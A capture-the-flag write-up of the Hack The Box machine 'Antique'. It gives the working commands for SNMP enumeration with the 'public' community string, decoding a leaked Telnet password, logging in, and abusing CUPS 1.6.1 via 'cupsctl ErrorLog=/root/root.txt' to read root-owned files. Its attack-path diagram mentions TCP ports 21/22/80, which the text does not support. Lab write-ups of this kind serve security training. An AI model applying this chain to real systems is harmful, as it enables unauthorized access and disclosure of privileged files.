
# HTB - Antique

## Machine Information

| Information      | Details                                                                                            |
| ---------------- | -------------------------------------------------------------------------------------------------- |
| Machine          | Antique                                                                                            |
| IP Address       | `10.129.58.178`                                                                                    |
| Attacker IP      | `10.10.15.198`                                                                                     |
| Operating System | Linux                                                                                              |
| Difficulty       | Easy                                                                                               |
| Main Services    | SNMP, Telnet, CUPS                                                                                 |
| Attack Vector    | SNMP Enumeration, Credential Disclosure, Telnet Access, CUPS Misconfiguration, Arbitrary File Read |

# 1. Reconnaissance

The target machine was assigned the following IP address:

```text
10.129.58.178
```

My attacking machine had the following IP address:

```text
10.10.15.198
```

As usual, I started with a full TCP port scan:

```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -sV 10.129.58.178 -oG Allports
```

The scan returned only one open TCP port.

This was unusual because the machine appeared to expose very little through TCP, so instead of assuming there was nothing else to enumerate, I decided to check UDP.

# 2. UDP Enumeration

Since SNMP commonly operates over UDP port 161, I repeated the scan while adding UDP scanning:

```bash
sudo nmap -p- --open -sSU --min-rate 5000 -vvv -n -Pn -sV 10.129.58.178 -oG Allports
```

This revealed another open port:

```text
161/udp
```

I then performed targeted enumeration against UDP port 161:

```bash
sudo nmap -sCVU -p161 10.129.58.178
```

The service was identified as:

```text
SNMP
```

Since there was no web service available to enumerate, SNMP became the primary attack surface.

# 3. SNMP Enumeration

I started by testing the common SNMP community string:

```text
public
```

using:

```bash
snmpwalk -v 2c -c public 10.129.58.178
```

The response contained information identifying the system as an HTB printer.

The printer information was also consistent with what appeared when connecting through Telnet, where the service identified itself as:

```text
HP JetDirect
```

This indicated that the target was emulating an HP JetDirect printer.

More importantly, SNMP was allowing unauthenticated enumeration with the `public` community string.

I wanted to enumerate the SNMP tree more extensively, so instead of relying only on the default walk, I specified the OID tree starting from `1`:

```bash
snmpwalk -v 2c -c public 10.129.58.178 1
```

This produced a much larger amount of information.

# 4. Extracting the Telnet Credentials from SNMP

While examining the SNMP output, I found a sequence of hexadecimal values that looked like encoded data.

I converted the hexadecimal sequence back into its original representation:

```bash
echo '50 40 73 73 77 30 72 64 40 31 32 33 21 21 31 32
33 1 3 9 17 18 19 22 23 25 26 27 30 31 33 34 35 37 38 39 42 43 49 50 51 54 57 58 61 65 74 75 79 82 83 86 90 91 94 95 98 103 106 111 114 115 119 122 123 126 130 131 134 135' | tr -d ' ' | xxd -r -p
```

The decoded information began with:

```text
P@ssw0rd@123!!123
```

The important credential was:

```text
P@ssw0rd@123!!123
```

This gave me a direct way to authenticate to the Telnet service.

# 5. Telnet Access

With the recovered password, I connected to the Telnet service.

```bash
telnet 10.129.58.178
```

When prompted for the password, I used:

```text
P@ssw0rd@123!!123
```

The authentication was successful.

After logging in, I immediately noticed that I could access the user flag.

I initially retrieved it using:

```text
exec cat user.txt
```

The user flag was:

```text
7674365104a2de572783a80559a984ab
```

To make enumeration easier, I then established a reverse shell instead of repeatedly using `exec` through the Telnet environment.

# 6. Privilege Escalation Enumeration

Once I had a shell, I checked my current identity and group memberships:

```bash
id
```

An interesting group appeared:

```text
lpadmin
```

This was worth investigating because the machine was clearly configured as a printing server.

I then looked around the directories associated with the printing subsystem.

Inside:

```text
/var/run/cups/certs
```

I found a file named:

```text
0
```

I inspected it:

```bash
cat 0
```

The file contained:

```text
BEB987769DE56E872C06F3B4EDEFA506
```

At this point, I also checked the locally listening services.

# 7. Discovering the CUPS Service

I used `netstat` to inspect listening ports:

```bash
netstat -an
```

Among the local services, I found port:

```text
631
```

Port 631 is commonly associated with CUPS, the Common UNIX Printing System.

Since it was listening locally, I queried it directly:

```bash
curl http://127.0.0.1:631
```

The response identified the service as:

```text
CUPS 1.6.1
```

The relevant portion was:

```html
<TABLE CLASS="indent" SUMMARY="">
<TR><TD STYLE="padding-right: 20px;">

<H1>CUPS 1.6.1</H1>

<P>CUPS is the standards-based, open source printing system developed by
<A HREF="http://www.apple.com/">Apple Inc.</A> for OS<SUP>&reg;</SUP; X and
other UNIX<SUP;&reg;</SUP;-like operating systems.</P>
```

The important information was the version:

```text
CUPS 1.6.1
```

# 8. Researching CUPS 1.6.1

I researched the CUPS version to determine whether there were known vulnerabilities that could be useful for privilege escalation.

Interestingly, searching directly with:

```bash
searchsploit CUPS 1.6.1
```

did not immediately reveal the relevant vulnerability.

Therefore, I researched the version and its functionality manually.

This led me to understand the relationship between the CUPS certificate directory and the `ErrorLog` configuration.

The important point was that the CUPS service could be manipulated through `cupsctl`, which is used to configure CUPS.

The previously discovered file:

```text
/var/run/cups/certs/0
```

was therefore an important clue.

# 9. Exploiting CUPS to Read the Root Flag

I used `cupsctl` to change the CUPS `ErrorLog` location:

```bash
cupsctl ErrorLog=/root/root.txt
```

This changed the CUPS error log destination to:

```text
/root/root.txt
```

The idea was that CUPS, running with elevated privileges, would interact with the configured log file.

I then accessed the CUPS error log endpoint through the local web interface:

```bash
curl http://127.0.0.1:631/admin/log/error_log
```

The response was:

```text
ba0b2e3ef5fb03aa86dc11baf9a158e4
```

This was the root flag.

The important part is that I did not need to obtain a root shell. By abusing the CUPS configuration and its privileged access to the filesystem, I was able to retrieve the contents of `/root/root.txt` directly through the CUPS log interface.

# Attack Path

```text
TCP Enumeration
    |
    v
Only TCP Port 21/22/80 Not Relevant
    |
    v
UDP Enumeration
    |
    v
161/UDP SNMP
    |
    v
SNMP Community String: public
    |
    v
Extended SNMP Enumeration
    |
    v
Encoded Credential Discovery
    |
    v
P@ssw0rd@123!!123
    |
    v
Telnet
    |
    v
User Shell
    |
    v
User Flag
    |
    v
lpadmin Group
    |
    v
CUPS Enumeration
    |
    v
127.0.0.1:631
    |
    v
CUPS 1.6.1
    |
    v
cupsctl ErrorLog=/root/root.txt
    |
    v
CUPS Error Log Endpoint
    |
    v
Root Flag
```

# Vulnerabilities & Techniques

## SNMP Enumeration

SNMP was accessible using the default community string:

```text
public
```

This allowed extensive enumeration of the target's SNMP information.

The command:

```bash
snmpwalk -v 2c -c public 10.129.58.178 1
```

was particularly useful because it walked the SNMP tree starting from OID `1`.

## Sensitive Information Disclosure

The SNMP data contained information that eventually revealed a credential.

After decoding the hexadecimal data, the password was recovered as:

```text
P@ssw0rd@123!!123
```

## Credential Reuse

The recovered password was valid for the Telnet service.

This provided access to the system as the user associated with the JetDirect service.

## Telnet

The Telnet service exposed an interactive remote shell after authentication.

Although Telnet itself is insecure because it transmits data without encryption, in this machine the more important issue was that valid credentials had already been disclosed through SNMP.

## Linux Group Enumeration

After obtaining shell access, checking:

```bash
id
```

revealed membership in:

```text
lpadmin
```

This was an important clue because the machine was running a printing service.

## CUPS Enumeration

Local network enumeration revealed:

```text
631
```

which was running CUPS.

Querying it with:

```bash
curl http://127.0.0.1:631
```

revealed:

```text
CUPS 1.6.1
```

## CUPS Privilege Escalation

The key privilege escalation was abusing CUPS configuration through:

```bash
cupsctl ErrorLog=/root/root.txt
```

The CUPS log interface could then be queried with:

```bash
curl http://127.0.0.1:631/admin/log/error_log
```

This exposed the contents of the root flag.

Unlike a traditional privilege escalation where the goal is to obtain a root shell, this attack allowed direct reading of a root-owned file.

# Lessons Learned

Antique was a good example of why a machine with almost no visible TCP attack surface should not be considered finished after the first Nmap scan.

The initial scan showed very little, but checking UDP revealed the important service:

```text
161/UDP
```

From there, SNMP enumeration became the key to initial access.

Another important lesson was to fully enumerate SNMP rather than stopping after identifying the service. Using:

```bash
snmpwalk -v 2c -c public 10.129.58.178 1
```

exposed significantly more information than a basic service check.

The machine also reinforced the importance of checking local services after obtaining a shell. CUPS was not directly exposed externally, but:

```bash
netstat -an
```

revealed port `631` listening locally.

Finally, the privilege escalation did not require a traditional root shell. By abusing the CUPS configuration and its privileged access, the contents of `/root/root.txt` could be retrieved directly.

The complete chain was:

```text
UDP Enumeration
SNMP
Credential Disclosure
Telnet
User Access
lpadmin Enumeration
CUPS
cupsctl Abuse
Arbitrary Root File Read
Root Flag
```

pwned :)))))
